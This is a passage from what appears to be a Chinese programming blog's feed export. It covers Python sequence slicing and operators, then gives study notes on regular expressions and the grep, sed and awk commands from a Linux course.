<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lst <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> lst<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> lst<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment"># 两个索引都省略</span>
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>要注意的是，下面两种分片并不等价：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lst<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> lst<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>注意</strong>：分片操作返回的序列是从原序列复制指定的范围内的元素而生成的，在新的序列中给元素重新赋值，并不影响原序列。</p>
<p>我们还可以再指定一个数字来表示<strong>步长</strong>，具体看下面例子：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lst <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> lst<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>上面的例子中，从索引0开始，每<strong>2</strong>个元素就取一个元素，这个<strong>2</strong>就是我所说的<strong>步长</strong>，在之前的例子中，我们的没有提供步长，这时的步长默认就是1。</p>
<p>当然，步长不可以为0，步长为0将会报错。但是步长可以是负数！，这时分片从右往左提取元素：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lst <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> lst<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>上面例子中，分片从索引4的元素开始，每一步取一个元素，直到索引1（不包括该元素）。</p>
<p>使用负数的步长常常会使人困惑，建议如无必要，还是不要使用负数的步长。</p>
<h4 id="加法"><a href="#加法" class="headerlink" title="加法"></a>加法</h4><p>通过使用加法运算符<code>+</code>，我们可以进行序列的连接操作：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">'hello'</span> <span class="token operator">+</span> <span class="token string">'world'</span>
<span class="token string">'helloworld'</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这十分简单，不过要注意，只有在<strong>相同类型</strong>的序列之间，才可以进行相加，不然就报错：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'hello'</span>
Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>
  File <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>
TypeError<span class="token punctuation">:</span> can only concatenate <span class="token builtin">list</span> <span class="token punctuation">(</span><span class="token keyword">not</span> <span class="token string">"str"</span><span class="token punctuation">)</span> to <span class="token builtin">list</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="乘法"><a href="#乘法" class="headerlink" title="乘法"></a>乘法</h4><p>我们把一个序列与整数n相乘来生成一个新的序列，这个新的序列将被重复n次：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">5</span>
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">'hello '</span> <span class="token operator">*</span> <span class="token number">3</span>
<span class="token string">'hello hello hello '</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="成员资格"><a href="#成员资格" class="headerlink" title="成员资格"></a>成员资格</h4><p>我们把确认一个值是否在序列中，称为检查这个值在序列中的<strong>成员资格</strong>。我们可以用运算符<code>in</code>来实现：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lst <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token number">1</span> <span class="token keyword">in</span> lst
<span class="token boolean">True</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">in</span> lst
<span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>字符串比较特殊，我们不仅可以检查某个<strong>字符</strong>是否在一个字符串中，而且可以检查某个另一个<strong>字符串</strong>是否在该字符串中：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> s <span class="token operator">=</span> <span class="token string">'hello world'</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">'w'</span> <span class="token keyword">in</span> s
<span class="token boolean">True</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token string">'world'</span> <span class="token keyword">in</span> s
<span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="操作序列的函数"><a href="#操作序列的函数" class="headerlink" title="操作序列的函数"></a>操作序列的函数</h4><p>除了上面的序列操作外，python还提供了一些内建函数用于操作序列，下面介绍最常用的len、min、max函数。</p>
<p>使用len函数可以得到序列的长度，也就是序列中元素的数量：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lst <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">len</span><span class="token punctuation">(</span>lst<span class="token punctuation">)</span>
<span class="token number">3</span>
<span class="token operator">>></span><span class="token operator">></span> s <span class="token operator">=</span> <span class="token string">'hello'</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
<span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>min和max函数分别返回序列中的最小和最大的元素：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lst <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">min</span><span class="token punctuation">(</span>lst<span class="token punctuation">)</span>
<span class="token number">1</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">max</span><span class="token punctuation">(</span><span class="token string">'hello world'</span><span class="token punctuation">)</span>
<span class="token string">'w'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>min和max函数的参数还可以是多个参数：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">max</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
<span class="token number">5</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">min</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
<span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>这个时候相当于全部参数被收集成一个列表，再从中求出最大或最小的元素</p>
<hr>
<p>本节到此为止，读者们好好消化，我们下期再见！</p>
]]></content>
  </entry>
  <entry>
    <title>Linux开发环境及应用·第二周·正则表达式及相关命令</title>
    <url>/7ccebcef/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>正则表达式及相关命令的学习笔记<span id="more"></span></p>
<h2 id="正则表达式的概念"><a href="#正则表达式的概念" class="headerlink" title="正则表达式的概念"></a>正则表达式的概念</h2><p>正则表达式英文为“Regular Expressions”，是一种匹配字符串的模式。</p>
<p>主要用来匹配字符串和替换字符串。</p>
<p><strong>注意</strong>：正则表达式与文件名通配符规则不同。</p>
<h3 id="最基本的正则表达式"><a href="#最基本的正则表达式" class="headerlink" title="最基本的正则表达式"></a>最基本的正则表达式</h3><p>正则表达式版本繁多，最基本的正则表达式只有六个元字符（特殊字符）：<code>.</code>、<code>\</code>、<code>[</code>、<code>^</code>、<code>$</code>、<code>*</code>，除了以上六个元字符外，其它字符与其自身匹配。</p>
<h4 id="圆点"><a href="#圆点" class="headerlink" title="圆点"></a>圆点</h4><p> <code>.</code>匹配<strong>任何</strong>一个字符，如<code>.</code>可以匹配字符<code>a</code>、<code>b</code>、<code>1</code>、<code>2</code>……</p>
<h4 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线"></a>反斜线</h4><p><code>\</code>为转义字符，可以用来取消后面一个元字符的特殊含义，比如：<code>\*</code>匹配<code>*</code>本身这个字符，而不是元字符<code>*</code>的特殊含义。转移字符后面紧跟的不应该是除元字符以外的字符。</p>
<p>之后的软件对正则表达是进行了扩展，使反斜线后面可以跟其它字符，表示其它特殊含义。</p>
<h4 id="定义集合"><a href="#定义集合" class="headerlink" title="定义集合"></a>定义集合</h4><p>左方括号<code>[</code>用来与右方括号<code>]</code>组合定义一个集合，匹配集合中的任意一个字符，如：<code>[abc]</code>匹配<code>a</code>或<code>b</code>、<code>c</code>。</p>
<p>圆点，星号，反斜线在方括号内没有特殊含义，仅表示其自身，如：<code>[.*\]</code>匹配字符<code>.</code>或<code>*</code>、<code>\</code>。</p>
<p>可以用减号<code>-</code>定义一个区间，如：<code>[a-z]</code>表示26个小写字母，<code>[a-zA-Z0-9]</code>表示26个字母和数字。</p>
<p><code>[][]</code>表示含左右方括号两个字符的集合。（这里有点迷惑）</p>
<p>减号在最后，则失去表示区间的意义，如：<code>[az-]</code>匹配字符<code>a</code>或<code>z</code>、<code>-</code>。</p>
<p>用<code>^</code>放在<strong>开头</strong>，表示补集。比如：<code>[^a-z]</code>匹配一个不是小写字母的字符</p>
<h4 id="星号"><a href="#星号" class="headerlink" title="星号"></a>星号</h4><p><code>*</code>表示前面的<strong>单字符正则表达式</strong>出现0次或者多次，单字符正则表达式是指表示一个字符的正则表达式，如：表示一个字符<code>a</code>的正则表达式有<code>a</code>、<code>.</code>、<code>[a-z]</code>……。</p>
<p><code>*</code>的用法举例：</p>
<ul>
<li><code>12*4</code>可以匹配字符串<code>14</code>（<code>2</code>出现0次）、<code>12224</code>（<code>2</code>出现3次）……</li>
<li><code>[A-Z][0-9]*</code>可以匹配<code>[A-Z]</code>、<code>[A-Z][0-9]</code>、<code>[A-Z][0-9][0-9]</code>等正则表达式匹配的字符串</li>
</ul>
<h4 id="锚点"><a href="#锚点" class="headerlink" title="锚点"></a>锚点</h4><p>锚点有两个：<code>$</code>和<code>^</code>。</p>
<p><code>$</code>放在正则表达式的尾部时表示匹配的字符串在行尾，否则匹配字符<code>$</code>自身，如：<code>123$</code>匹配行尾的字符串<code>123</code>，<code>$123</code>匹配字符串<code>$123</code>。</p>
<p><code>^</code>放在正则表达式的首部时表示匹配的字符串在行首，否则匹配字符<code>^</code>自身，如：<code>^123</code>匹配行首的字符串<code>123</code>，<code>123^</code>匹配字符串<code>123^</code>。</p>
<p>在vi编辑文件的时候，可以用以下的命令删除10-50行的每行行首的4个空格（下面空白处是4个空格）：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">10</span>,50s/^    //g<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h3 id="正则表达式的扩展"><a href="#正则表达式的扩展" class="headerlink" title="正则表达式的扩展"></a>正则表达式的扩展</h3><p>正则表达式的扩展主要有<code>ERE</code>、<code>PCRE</code>（Perl语言兼容的扩展正则表达式）。</p>
<p>扩展的正则表达式和基本正则表达式的规则是<strong>不兼容</strong>的。</p>
<p>下面是一些扩展的简单介绍。</p>
<h4 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h4><p>用圆括号<code>()</code>表示分组，如：<code>(xy)*</code>可匹配字符串<code>xy</code>，<code>xyxy</code>，<code>xyxyxy</code>……也就是把一个分组当作一个整体来看待。</p>
<p>在圆括号中还可以使用<code>|</code>表示逻辑“或”，如：<code>(pink|green)</code>可以与字符串<code>pink</code>或<code>green</code>匹配。</p>
<h4 id="重复次数定义"><a href="#重复次数定义" class="headerlink" title="重复次数定义"></a>重复次数定义</h4><p>可以使用<code>+</code>表示重复1次或多次，<code>?</code>表示重复0次或1次。</p>
<p>还可以限定重复次数<code>\&#123;m,n\&#125;</code>，例如：<code>[0-9]\&#123;6,10\&#125;</code>可以匹配6-10位数字。</p>
<h4 id="命名的与预定义集合"><a href="#命名的与预定义集合" class="headerlink" title="命名的与预定义集合"></a>命名的与预定义集合</h4><p><code>[[:xdigit:]]</code>表示十六进制数字，<code>\d</code>表示数字，<code>\D</code>表示非数字等等</p>
<hr>
<h3 id="正则表达式相关命令"><a href="#正则表达式相关命令" class="headerlink" title="正则表达式相关命令"></a>正则表达式相关命令</h3><h4 id="行筛选grep"><a href="#行筛选grep" class="headerlink" title="行筛选grep"></a>行筛选grep</h4><p>命令grep、egrep、fgrep用于在文件中查找字符串，是逐行筛选的。</p>
<p>grep语法如下：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">grep</span> 模式 文件名列表<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可以处理多个文件，所以后面可以提供一系列的文件名做参数。</p>
<p>模式使用正则表达式的模式。</p>
<p>egrep使用扩展正则表达式ERE描述的模式；</p>
<p>fgrep用于快速搜索指定字符串，是按照字符串搜索而不是按照正则表达式模式搜索。</p>
<p>grep的模式选项有：</p>
<ul>
<li>-F，–fixed-strings 按照字符串搜索而不是按照正则表达式模式搜索，同fgrep命令</li>
<li>-G，–basic-regexp 使用基本正则表达式模式</li>
<li>-E，–extended-regexp 使用扩展正则表达式ERE模式，同egrep命令</li>
<li>-P，–perl-regexp 使用Perl语言兼容的扩展正则表达式模式（PCRE）</li>
</ul>
<p>使用<code>man pcresyntax</code>可以查阅PCRE的语法。</p>
<p>其它常用选项：</p>
<ul>
<li>-n 显示行号</li>
<li>-v 显示所有不匹配的行，不加这个选项是显示匹配的行</li>
<li>-i 忽略字母大小写</li>
</ul>
<h4 id="流编辑sed"><a href="#流编辑sed" class="headerlink" title="流编辑sed"></a>流编辑sed</h4><p>用法：</p>
<ul>
<li><code>sed &#39;命令&#39; 文件名列表</code> 一个命令</li>
<li><code>sed -e &#39;命令1&#39; -e &#39;命令2&#39; -e &#39;命令3&#39; 文件名列表</code> 多个命令</li>
<li><code>sed -f 命令文件 文件名列表</code> 命令太多可卸载文件里，命令文件的每行为一个命令</li>
</ul>
<p>常用的命令是替换命令，比如： <code>s/regx/string/g</code>，开头的<code>s</code>表示把正则表达式regx匹配的字符串替换成字符串string，<code>g</code>表示这一行全部匹配的字符串都进行替换。</p>
<p>正则表达式中添加<code>\(</code>和<code>\)</code>不影响匹配操作，并且可以使用<code>\0</code>表示匹配的整个字符串，<code>\1</code>，<code>\2</code>，<code>\3</code>等表示第1、2、3等个<code>\(</code>和<code>\)</code>之间匹配到的字符串，例如：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">s/<span class="token punctuation">\</span><span class="token punctuation">(</span><span class="token punctuation">[</span>a-zA-Z_<span class="token punctuation">]</span><span class="token punctuation">[</span>a-zA-Z0-9_<span class="token punctuation">]</span>*<span class="token punctuation">\</span><span class="token punctuation">)</span>-<span class="token operator">></span>number/<span class="token punctuation">\</span><span class="token number">1</span>-<span class="token operator">></span>num/g<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用上面的命令可以把所有形如<code>str-&gt;number</code>的字符串替换成<code>str-num</code>，这里的<code>\1</code>就是匹配到的<code>str</code>。</p>
<p><strong>注意</strong>：和大多数文本处理命令一样，输入从标准输入或者文件获取；而输出即编辑结果则输出到标准输出，而不是修改原文件。</p>
<h4 id="文本加工awk"><a href="#文本加工awk" class="headerlink" title="文本加工awk"></a>文本加工awk</h4><p>awk用来逐行扫描进行文本处理，相当于一门小型语言。</p>
<p>用法：</p>
<ul>
<li><code>awk &#39;程序&#39; 文件名列表</code>  </li>
<li><code>awk -f 程序文件名 文件名列表</code> 当程序较多，可以写在一个文件内，文件的每行为一个程序</li>
</ul>
<p>程序的格式为：<code>条件 &#123;动作&#125;</code>，awk自动对每行文本执行条件判断，满足条件执行动作。</p>
<p>输入的文件的每行作为一个“记录”，变量NR就是行号；每行用空格分隔开的部分，叫做记录的“域”，内置变量<code>$1</code>是第1域内容，<code>$2</code>是第2域内容，依次类推。<code>$0</code>是整行内容。</p>
<h5 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h5><p>条件可以是使用与C语言类似的关系运算符、逻辑运算符等；也可以使用正则表达式的模式匹配<code>/regexpr/</code>，包含该模式的行，执行动作。</p>
<p>特殊的条件：</p>
<ul>
<li>不指定任何条件，对所有文本行执行动作</li>
<li>BEGIN，开始处理所有文本行之前执行动作</li>
</ul>
<h5 id="动作"><a href="#动作" class="headerlink" title="动作"></a>动作</h5><p>描述“动作”时，简单的用法有：</p>
<ul>
<li>定义变量</li>
<li>加减乘除等算术逻辑运算</li>
<li>正则表达式匹配运输符（用作条件判断）<code>～</code>、<code>!～</code><br>  例如：<code>$2 ~ &quot;[1-9][0-9]*&quot;</code></li>
<li>流程控制（与C语言类似）<br>  条件判断if<br>  循环控制for</li>
<li>打印输出：<ul>
<li><code>print 变量1,变量2, ...</code></li>
<li><code>printf(&quot;格式字符串&quot;, 变量1, 变量2, ...)</code> 和C语言一样</li>
<li><h5 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h5>现有下列输出的文本信息：<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">cat</span> wr.c 
<span class="token comment">#include &lt;fcntl.h></span>
<span class="token comment">#include &lt;stdio.h></span>
<span class="token comment">#include &lt;errno.h></span>
<span class="token comment">#include &lt;string.h></span>

int main<span class="token punctuation">(</span>char argc, char *argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    int fd<span class="token punctuation">;</span>

    fd <span class="token operator">=</span> open<span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>, O_WRONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> -1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        printf<span class="token punctuation">(</span><span class="token string">"ERROR %d: %m<span class="token entity" title="\n">\n</span>"</span>, errno<span class="token punctuation">)</span><span class="token punctuation">;</span>
        printf<span class="token punctuation">(</span><span class="token string">"ERROR [%s]<span class="token entity" title="\n">\n</span>"</span>, strerror<span class="token punctuation">(</span>errno<span class="token punctuation">))</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

</li>
</ul>
</li>
</ul>
<p>可以使用awk实现添加行号，类似命令<code>cat -n wr.c</code>：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">awk</span> <span class="token string">'&#123;printf("%d: %s\n", NR, $0);&#125;'</span> wr.c      
<span class="token number">1</span>: <span class="token comment">#include &lt;fcntl.h></span>
<span class="token number">2</span>: <span class="token comment">#include &lt;stdio.h></span>
<span class="token number">3</span>: <span class="token comment">#include &lt;errno.h></span>
<span class="token number">4</span>: <span class="token comment">#include &lt;string.h></span>
<span class="token number">5</span>: 
<span class="token number">6</span>: int main<span class="token punctuation">(</span>char argc, char *argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token number">7</span>: <span class="token punctuation">&#123;</span>
<span class="token number">8</span>:     int fd<span class="token punctuation">;</span>
<span class="token number">9</span>: 
<span class="token number">10</span>:     fd <span class="token operator">=</span> open<span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>, O_WRONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token number">11</span>:     <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> -1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token number">12</span>:         printf<span class="token punctuation">(</span><span class="token string">"ERROR %d: %m<span class="token entity" title="\n">\n</span>"</span>, errno<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token number">13</span>:         printf<span class="token punctuation">(</span><span class="token string">"ERROR [%s]<span class="token entity" title="\n">\n</span>"</span>, strerror<span class="token punctuation">(</span>errno<span class="token punctuation">))</span><span class="token punctuation">;</span>
<span class="token number">14</span>:     <span class="token punctuation">&#125;</span>
<span class="token number">15</span>: <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>列出大小大于2000字节的文件：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">ls</span> -al <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'$5 > 2000 &#123;print $0&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

]]></content>
      <categories>
        <category>MOOC课程学习·Linux开发环境及应用</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux开发环境及应用-第一周-文本文件的处理</title>
    <url>/7ccebcef/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>介绍Linux中的文本信息，以及学习文本文件处理的相关命令。</p>
<span id="more"></span>

<h3 id="Linux中的文本信息"><a href="#Linux中的文本信息" class="headerlink" title="Linux中的文本信息"></a>Linux中的文本信息</h3><p>主要分为以下几类：</p>
<ul>
<li>C语言，Java语言等编程文件的源程序文本文件</li>
<li>文本格式的数据文件</li>
<li>文本格式的文字信息</li>
<li>系统配置信息 如/etc下的配置文件</li>
<li>程序的输出</li>
</ul>
<h4 id="文本型网络协议"><a href="#文本型网络协议" class="headerlink" title="文本型网络协议"></a>文本型网络协议</h4><p>因特网大部分传输层以上的协议是文本型协议</p>
<p>例如：</p>
<ul>
<li>会话层协议：HTTP，POP3，SMTP，IMAP</li>
<li>表示层协议：HTML，XML，MIME，JSON</li>
</ul>
<h3 id="文本文件处理常用命令"><a href="#文本文件处理常用命令" class="headerlink" title="文本文件处理常用命令"></a>文本文件处理常用命令</h3><p>可以使用重定向机制和管道机制，把多个命令组合使用。</p>
